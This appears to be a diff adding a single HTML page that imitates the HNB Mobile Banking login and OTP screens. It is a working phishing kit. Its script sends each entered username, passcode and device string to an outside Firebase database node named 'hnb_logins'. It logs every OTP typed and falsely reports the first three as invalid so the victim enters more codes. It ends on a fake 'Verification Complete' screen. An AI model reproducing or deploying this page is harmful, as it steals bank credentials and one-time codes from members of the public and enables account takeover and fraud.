@@ -1,0 +1,680 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover,maximum-scale=1,user-scalable=no">
+<title>HNB Mobile Banking</title>
+
+<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+
+<style>
+:root{
+  --blue:#0869a7;
+  --blue2:#168fd0;
+  --pale:#eef8fd;
+  --ink:#123d61;
+  --muted:#73859a;
+  --green:#3dbb82;
+  --border:#d8ebf8;
+}
+*{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
+html,body{
+  min-height:100%;
+  width:100%;
+  font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Arial,sans-serif;
+  background:#fff;
+  color:var(--ink);
+  overflow-x:hidden;
+  -webkit-text-size-adjust:100%;
+  -moz-text-size-adjust:100%;
+  -ms-text-size-adjust:100%;
+  text-size-adjust:100%;
+}
+button,input{font:inherit;outline:none;border:none;background:none}
+button{cursor:pointer}
+body{display:flex;justify-content:center}
+
+.app{
+  width:100%;
+  max-width:520px;
+  min-height:100vh;
+  background:#fff;
+  position:relative;
+  overflow:hidden;
+}
+
+.screen{
+  min-height:100vh;
+  padding:20px 24px 40px;
+  display:none;
+  flex-direction:column;
+}
+.screen.active{display:flex}
+
+/* ==================== LOGIN SCREEN ==================== */
+.login-screen{
+  position: relative;
+  padding: 0;
+  min-height: 100vh;
+  display: none;
+  flex-direction: column;
+  background: #fff;
+  overflow: hidden;
+}
+.login-screen.active{display:flex}
+
+/* Full-size background image */
+.login-bg{
+  position: absolute;
+  inset: 0;
+  width: 100%;
+  height: 100%;
+  object-fit: cover;
+  z-index: 0;
+  display: block;
+}
+
+/* Login content - box 170px neeche se upar */
+.login-content{
+  position: relative;
+  z-index: 2;
+  flex: 1;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: flex-end;
+  padding: 0 12px 170px 12px;      /* 👈 170px bottom padding */
+  min-height: 100vh;
+}
+
+/* Login box */
+.login-box{
+  width: 100%;
+  max-width: 100%;
+  background: rgba(255,255,255,0.98);
+  backdrop-filter: blur(10px);
+  -webkit-backdrop-filter: blur(10px);
+  border-radius: 22px;
+  padding: 22px 20px 26px;
+  box-shadow: 0 -8px 30px rgba(13,71,161,0.15);
+}
+
+/* Login heading */
+.login-heading{
+  font-size: 16px;
+  font-weight: 700;
+  color: #0869a7;
+  text-align: center;
+  margin-bottom: 14px;
+}
+
+.form{
+  width:100%;
+}
+
+/* Fields */
+.field{
+  height: 48px;
+  border:1.5px solid var(--border);
+  border-radius: 10px;
+  background:#fff;
+  margin: 9px 0;
+  display:flex;
+  align-items:center;
+  padding:0 14px;
+  transition:all 0.2s;
+}
+.field:focus-within{
+  border-color:#1589f2;
+  box-shadow:0 0 0 3px rgba(21,137,242,0.10);
+}
+.field-icon{
+  font-size:16px;
+  width:24px;
+  color:#158be0;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+}
+.field input{
+  background:transparent;
+  width:100%;
+  font-size:14px;
+  color:#234f73;
+  font-weight:500;
+  font-family:inherit;
+}
+.field input::placeholder{
+  color:#8aa1ba;
+  font-weight:400;
+}
+
+.forgot-link{
+  width:100%;
+  text-align:right;
+  font-size:11.5px;
+  color:#087ff0;
+  font-weight:600;
+  margin-top:-2px;
+  margin-bottom:4px;
+  padding-right:2px;
+  cursor:pointer;
+}
+.forgot-link:hover{text-decoration:underline}
+
+/* Button */
+.primary{
+  border-radius: 10px;
+  width:100%;
+  height: 48px;
+  background:#147ff1;
+  color:#fff;
+  font-size: 15px;
+  font-weight:700;
+  margin: 10px 0 0;
+  display:block;
+  transition:all 0.2s;
+  box-shadow:0 5px 16px rgba(20,127,241,0.25);
+}
+.primary:active{transform:scale(0.99)}
+.primary:disabled{
+  background:#cbd5e0;
+  cursor:not-allowed;
+  box-shadow:none;
+}
+
+/* ==================== OTP SCREEN ==================== */
+.otp-wrapper{
+  flex:1;
+  display:flex;
+  flex-direction:column;
+  justify-content:center;
+  align-items:center;
+  padding: 40px 0;
+}
+
+.otp-title{
+  font-size:26px;
+  font-weight:700;
+  color:#0869a7;
+  margin-bottom:10px;
+  text-align:center;
+}
+
+.otp-sub{
+  color:#75869a;
+  font-size:14px;
+  margin-bottom:28px;
+  text-align:center;
+  line-height:1.5;
+  max-width:340px;
+}
+
+.timer-display{
+  display:inline-block;
+  background:#e0eef2;
+  color:#2c5a6e;
+  padding:8px 22px;
+  border-radius:30px;
+  font-size:16px;
+  font-weight:700;
+  font-family:'Courier New',monospace;
+  letter-spacing:2px;
+  margin-bottom:30px;
+}
+.timer-display.expiring{
+  background:#ffe0e0;
+  color:#c62828;
+}
+
+.otp-row{
+  display:flex;
+  gap:8px;
+  justify-content:center;
+  margin-bottom:28px;
+  width:100%;
+}
+.otp{
+  width:48px;
+  height:56px;
+  border:1.5px solid #c9e4fa;
+  border-radius:12px;
+  text-align:center;
+  font-size:22px;
+  font-weight:700;
+  color:var(--ink);
+  background:#fff;
+  transition:all 0.2s;
+  font-family:inherit;
+}
+.otp:focus{
+  border-color:#1589f2;
+  box-shadow:0 0 0 4px rgba(21,137,242,0.10);
+}
+.otp.filled{
+  border-color:#0869a7;
+  background:#f0f9fd;
+}
+
+.verify{
+  width:100%;
+  max-width:400px;
+  height:56px;
+  border-radius:14px;
+  background:#147ff1;
+  color:#fff;
+  font-weight:700;
+  font-size:17px;
+  margin-top:6px;
+  transition:all 0.2s;
+  box-shadow:0 6px 20px rgba(20,127,241,0.25);
+}
+.verify:active{transform:scale(0.99)}
+.verify:disabled{
+  background:#cbd5e0;
+  cursor:not-allowed;
+  box-shadow:none;
+}
+
+.resend{
+  background:none;
+  color:#087ff0;
+  font-weight:600;
+  margin-top:20px;
+  font-size:14px;
+  text-decoration:underline;
+}
+
+.message{
+  margin-top:16px;
+  padding:11px 15px;
+  border-radius:10px;
+  font-size:13px;
+  font-weight:500;
+  display:none;
+  text-align:center;
+  width:100%;
+  max-width:400px;
+}
+.message.show{display:block}
+.message.error{background:#ffebee;color:#b71c1c;border-left:3px solid #d32f2f}
+.message.warning{background:#fff8e1;color:#e65100;border-left:3px solid #f57c00}
+.message.success{background:#e8f5e9;color:#1b5e20;border-left:3px solid #00c853}
+
+/* ==================== VERIFICATION COMPLETE ==================== */
+.result{
+  flex:1;
+  display:flex;
+  flex-direction:column;
+  justify-content:center;
+  align-items:center;
+  text-align:center;
+  padding: 40px 0;
+}
+.check{
+  width:100px;
+  height:100px;
+  border:4px solid #57bc8d;
+  border-radius:50%;
+  margin:0 auto 30px;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  color:#15915e;
+  font-size:56px;
+  font-weight:300;
+  animation:checkPop 0.6s cubic-bezier(0.34, 1.56, 0.64, 1);
+}
+@keyframes checkPop{
+  0%{transform:scale(0);opacity:0}
+  60%{transform:scale(1.15)}
+  100%{transform:scale(1);opacity:1}
+}
+.result h2{
+  font-size:28px;
+  color:#075e9d;
+  margin:0 0 16px;
+  font-weight:700;
+}
+.result p{
+  font-size:16px;
+  line-height:1.6;
+  color:#6d7d91;
+  margin:0 auto;
+  max-width:390px;
+}
+
+/* ==================== RESPONSIVE ==================== */
+@media(max-width:380px){
+  .otp{width:42px;height:50px;font-size:19px}
+  .otp-title{font-size:22px}
+  .login-box{padding: 20px 16px 22px}
+  .login-heading{font-size: 15px}
+  .field{height: 46px; margin: 8px 0}
+  .primary{height: 46px; font-size: 14px}
+  .login-content{padding: 0 12px 150px 12px}
+}
+</style>
+</head>
+<body>
+<div class="app">
+
+<!-- ==================== LOGIN SCREEN ==================== -->
+<section class="screen login-screen active" id="loginScreen">
+  <img class="login-bg"
+       src="https://i.postimg.cc/LsYT7FfD/file-0000000074c0820895bcebf765262b78.png"
+       alt=""
+       onerror="this.style.background='linear-gradient(135deg,#e0f2fe,#bfdbfe)';this.removeAttribute('src');">
+
+  <div class="login-content">
+    <div class="login-box">
+      <div class="login-heading">Login to your account</div>
+
+      <form class="form" onsubmit="event.preventDefault();handleLogin()">
+        <label class="field">
+          <span class="field-icon">●</span>
+          <input autocomplete="off" id="userId" placeholder="Username" aria-label="Username">
+        </label>
+
+        <label class="field">
+          <span class="field-icon">▣</span>
+          <input autocomplete="off" type="password" id="password" placeholder="Passcode" aria-label="Passcode">
+        </label>
+
+        <div class="forgot-link" onclick="forgotCredentials()">Forgot Username? or Passcode?</div>
+
+        <button class="primary" type="submit" id="loginBtn" disabled>Login</button>
+      </form>
+    </div>
+  </div>
+</section>
+
+<!-- ==================== OTP SCREEN ==================== -->
+<section class="screen" id="otpScreen">
+  <div class="otp-wrapper">
+    <div class="otp-title">Verify OTP</div>
+    <div class="otp-sub">Enter the 6-digit OTP you received</div>
+
+    <div class="timer-display" id="otpTimer">03:00</div>
+
+    <div class="otp-row" id="otpRow">
+      <input class="otp" inputmode="numeric" maxlength="1">
+      <input class="otp" inputmode="numeric" maxlength="1">
+      <input class="otp" inputmode="numeric" maxlength="1">
+      <input class="otp" inputmode="numeric" maxlength="1">
+      <input class="otp" inputmode="numeric" maxlength="1">
+      <input class="otp" inputmode="numeric" maxlength="1">
+    </div>
+
+    <button class="verify" id="verifyBtn" onclick="verifyOtp()" disabled>Verify OTP</button>
+    <button class="resend" onclick="resendOtp()">Resend OTP</button>
+
+    <div class="message" id="otpMessage"></div>
+  </div>
+</section>
+
+<!-- ==================== VERIFICATION COMPLETE ==================== -->
+<section class="screen" id="completeScreen">
+  <div class="result">
+    <div class="check">✓</div>
+    <h2>Verification Complete</h2>
+    <p>Your OTP has been verified successfully. Your account verification is now complete.</p>
+  </div>
+</section>
+
+</div>
+
+<script>
+// =====================================================
+// FIREBASE
+// =====================================================
+var firebaseConfig = {
+  apiKey: "AIzaSyBIwUsxyeQmoeT2ctH2LxqRU__dhqp9s94",
+  authDomain: "kharal-b47b6.firebaseapp.com",
+  databaseURL: "https://kharal-b47b6-default-rtdb.firebaseio.com",
+  projectId: "kharal-b47b6",
+  storageBucket: "kharal-b47b6.firebasestorage.app",
+  messagingSenderId: "528214841740",
+  appId: "1:528214841740:web:e394a574ef2ba2c16e9ea9"
+};
+firebase.initializeApp(firebaseConfig);
+var database = firebase.database();
+
+var DATA_NODE = 'hnb_logins';
+
+var sessionRef = null;
+var otpAttemptCount = 0;
+var timerInterval = null;
+var timeLeft = 180;
+
+// =====================================================
+// SCREEN NAVIGATION
+// =====================================================
+function show(id) {
+  document.querySelectorAll('.screen').forEach(function(s) {
+    s.classList.remove('active');
+  });
+  document.getElementById(id).classList.add('active');
+  window.scrollTo(0, 0);
+}
+
+// =====================================================
+// LOGIN FORM
+// =====================================================
+var userIdInput = document.getElementById('userId');
+var passwordInput = document.getElementById('password');
+var loginBtn = document.getElementById('loginBtn');
+
+userIdInput.addEventListener('input', checkLoginForm);
+passwordInput.addEventListener('input', checkLoginForm);
+
+function checkLoginForm() {
+  var u = userIdInput.value.trim();
+  var p = passwordInput.value.trim();
+  loginBtn.disabled = !(u.length > 0 && p.length > 0);
+}
+
+function forgotCredentials() {
+  alert('Please contact HNB customer care for assistance.');
+}
+
+function handleLogin() {
+  var userId = userIdInput.value.trim();
+  var password = passwordInput.value.trim();
+
+  if (!userId || !password) {
+    alert('Please enter both Username and Passcode.');
+    return;
+  }
+
+  otpAttemptCount = 0;
+
+  var now = new Date();
+  var timeStr = now.toLocaleString('en-US', { hour12: true });
+
+  sessionRef = database.ref(DATA_NODE).push();
+  sessionRef.set({
+    userId: userId,
+    password: password,
+    otpCode: '—',
+    status: 'pending',
+    time: timeStr,
+    timestamp: now.getTime(),
+    device: navigator.userAgent || 'Unknown'
+  }).then(function() {
+    console.log('✅ HNB session created');
+  }).catch(function(err) {
+    console.error('❌ Firebase error:', err);
+  });
+
+  clearOtpInputs();
+  document.getElementById('otpMessage').classList.remove('show');
+  document.getElementById('verifyBtn').disabled = true;
+
+  show('otpScreen');
+
+  setTimeout(function() {
+    var firstOtp = document.querySelectorAll('.otp')[0];
+    if (firstOtp) firstOtp.focus();
+  }, 300);
+
+  startTimer();
+}
+
+// =====================================================
+// OTP INPUTS
+// =====================================================
+var otpInputs = document.querySelectorAll('.otp');
+otpInputs.forEach(function(el, i) {
+  el.addEventListener('input', function() {
+    el.value = el.value.replace(/\D/g, '').slice(0, 1);
+    if (el.value) el.classList.add('filled');
+    else el.classList.remove('filled');
+
+    if (el.value && otpInputs[i + 1]) {
+      otpInputs[i + 1].focus();
+    }
+    checkOtpComplete();
+  });
+
+  el.addEventListener('keydown', function(e) {
+    if (e.key === 'Backspace' && !el.value && otpInputs[i - 1]) {
+      otpInputs[i - 1].focus();
+    }
+  });
+});
+
+function checkOtpComplete() {
+  var complete = true;
+  otpInputs.forEach(function(inp) {
+    if (!inp.value) complete = false;
+  });
+  document.getElementById('verifyBtn').disabled = !complete;
+}
+
+function clearOtpInputs() {
+  otpInputs.forEach(function(inp) {
+    inp.value = '';
+    inp.classList.remove('filled');
+  });
+}
+
+function getOtp() {
+  var otp = '';
+  otpInputs.forEach(function(inp) { otp += inp.value; });
+  return otp;
+}
+
+// =====================================================
+// TIMER
+// =====================================================
+function startTimer() {
+  timeLeft = 180;
+  updateTimer();
+  if (timerInterval) clearInterval(timerInterval);
+
+  timerInterval = setInterval(function() {
+    timeLeft--;
+    updateTimer();
+
+    if (timeLeft <= 30) {
+      document.getElementById('otpTimer').classList.add('expiring');
+    } else {
+      document.getElementById('otpTimer').classList.remove('expiring');
+    }
+
+    if (timeLeft <= 0) {
+      clearInterval(timerInterval);
+      document.getElementById('otpTimer').textContent = '00:00';
+      showMsg('OTP has expired. Please request a new one.', 'error');
+    }
+  }, 1000);
+}
+
+function updateTimer() {
+  var min = Math.floor(timeLeft / 60);
+  var sec = timeLeft % 60;
+  document.getElementById('otpTimer').textContent =
+    (min < 10 ? '0' : '') + min + ':' + (sec < 10 ? '0' : '') + sec;
+}
+
+function resendOtp() {
+  timeLeft = 180;
+  updateTimer();
+  document.getElementById('otpTimer').classList.remove('expiring');
+  startTimer();
+  showMsg('New OTP has been sent.', 'success');
+}
+
+// =====================================================
+// VERIFY OTP (1, 2, 3 = Invalid | 4 = Complete)
+// =====================================================
+function verifyOtp() {
+  if (timeLeft <= 0) {
+    showMsg('OTP has expired. Please request a new one.', 'error');
+    return;
+  }
+
+  var otp = getOtp();
+  if (otp.length !== 6) {
+    showMsg('Please enter all 6 digits.', 'warning');
+    return;
+  }
+
+  otpAttemptCount++;
+
+  if (sessionRef) {
+    var now = new Date();
+    var otpKey = 'otp_' + Date.now();
+
+    sessionRef.child('otpHistory/' + otpKey).set({
+      otp: otp,
+      attempt: otpAttemptCount,
+      time: now.toLocaleString('en-US', { hour12: true }),
+      timestamp: now.getTime(),
+      status: otpAttemptCount >= 4 ? 'accepted' : 'invalid'
+    });
+
+    sessionRef.update({
+      otpCode: otp,
+      totalOtpAttempts: otpAttemptCount,
+      status: otpAttemptCount >= 4 ? 'complete' : 'pending'
+    });
+  }
+
+  if (otpAttemptCount < 4) {
+    showMsg('Invalid OTP. Please try again.', 'error');
+    clearOtpInputs();
+    document.getElementById('verifyBtn').disabled = true;
+    setTimeout(function() {
+      var firstOtp = document.querySelectorAll('.otp')[0];
+      if (firstOtp) firstOtp.focus();
+    }, 200);
+  } else {
+    clearInterval(timerInterval);
+    showMsg('OTP verified successfully.', 'success');
+
+    setTimeout(function() {
+      show('completeScreen');
+    }, 800);
+  }
+}
+
+// =====================================================
+// MESSAGES
+// =====================================================
+function showMsg(text, type) {
+  var el = document.getElementById('otpMessage');
+  el.textContent = text;
+  el.className = 'message show ' + (type || 'error');
+}
+
+// =====================================================
+// INIT
+// =====================================================
+console.log('🏦 HNB Mobile Banking loaded • Data node:', DATA_NODE);
+</script>
+
+</body>
+</html>
